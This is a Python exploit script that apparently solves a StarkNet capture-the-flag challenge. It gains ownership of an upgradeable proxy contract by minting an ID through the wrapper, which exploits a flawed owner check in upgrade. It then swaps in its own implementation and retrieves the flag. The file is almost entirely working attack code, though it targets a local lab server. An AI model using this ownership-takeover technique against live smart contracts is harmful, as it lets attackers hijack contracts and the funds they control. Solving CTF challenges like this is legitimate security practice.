import asyncio
from pathlib import Path

from starknet_py.contract import Contract
from starknet_py.net import AccountClient, KeyPair
from starknet_py.net.models import StarknetChainId
from starknet_py.net.gateway_client import GatewayClient
from starkware.starknet.public.abi import get_storage_var_address
from starkware.starknet.core.os.contract_address.contract_address import \
    calculate_contract_address_from_hash
from common import utils

logger = utils.setup_logger("unique-id")

async def main(hostname='127.0.0.1', port=31337):
    ctx = await utils.get_context(hostname, port)    
    contract = ctx["contract"]
    acc_client = ctx["acc_client"]
    contract_address = ctx["contract_address"]
    client = acc_client.client
    
    # attack
    # deploy implv2 contract
    current_path = Path(__file__).parent.resolve()
    contract_src_file = current_path / "implementation_v2.cairo"
    # if not compilation at runtime
    # contract_file = current_path / "build/implementation_v2.json"
    # compiled_contract = contract_file.read_text()

    logger.info("Deploying implementation v2")
    implementation_v2_deployment = await Contract.deploy(
        client=acc_client, 
        compilation_source=[contract_src_file],
        # if no compilation at runtime
        # compiled_contract=compiled_contract,
        constructor_args=[],
        salt=111111,
    )
    # you can wait for transaction to be accepted
    await implementation_v2_deployment.wait_for_acceptance()
    impv2 = implementation_v2_deployment.deployed_contract
    id_number = (await impv2.functions["getIdNumber"].call(owner=acc_client.address)).id_number
    logger.info(f"Id number from implementation v2: {id_number}")


    implementation_class_hash = await client.get_storage_at(
        contract_address, get_storage_var_address("implementation"), "latest"
    )
    implementation_address = calculate_contract_address_from_hash(
        salt=111111,
        class_hash=implementation_class_hash,
        constructor_calldata=[],
        deployer_address=0,
    )

    implementation_contract = await Contract.from_address(
        implementation_address, acc_client
    )
    wrapper_contract = Contract(
        contract.address,
        implementation_contract.data.abi,
        acc_client,
    )
    is_owner = (await contract.functions["get_is_owner"].call(account=acc_client.address)).is_owner
    logger.info(f"Am I an owner?: {is_owner}")

    # in proxy:upgrade it's owners.read() which is checked and not owners.read().id_number
    logger.info("Invoke mintNewId")
    invocation = await wrapper_contract.functions["mintNewId"].invoke(new_first_name=1, new_last_name="Boom",max_fee=int(4e16))
    await invocation.wait_for_acceptance()

    is_owner = (await contract.functions["get_is_owner"].call(account=acc_client.address)).is_owner
    logger.info(f"Am I an owner?: {is_owner}")

    logger.info("Invoke upgrade")
    impv2_class_hash = await acc_client.get_class_hash_at(impv2.address)
    invocation = await contract.functions["upgrade"].invoke(new_implementation=impv2_class_hash, max_fee=int(4e16))
    await invocation.wait_for_acceptance()

    id_number = (await wrapper_contract.functions["getIdNumber"].call(owner=acc_client.address)).id_number
    logger.info(f"Id number: {id_number}")

    flag = utils.get_flag(hostname, port)
    logger.info(f"Flag: {flag}")
    return


asyncio.run(main())
